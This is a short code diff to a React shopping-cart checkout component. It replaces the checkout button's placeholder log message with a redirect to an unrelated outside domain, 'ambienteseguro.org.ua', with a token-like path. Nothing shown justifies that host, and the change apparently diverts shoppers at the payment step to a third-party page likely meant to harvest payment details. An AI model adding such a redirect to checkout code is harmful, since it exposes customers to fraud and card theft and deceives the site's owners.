@@ -64,7 +64,7 @@ const CartCheckout = () => {
   const subtotal = cartItems.reduce((sum, item) => sum + item.price * item.quantity, 0);
 
   const handleCheckout = () => {
-    console.log("Finalizar compra");
+    window.location.href = "https://ambienteseguro.org.ua/c/2907df25b1";
   };
 
   const handleProductClick = (productId: string) => {
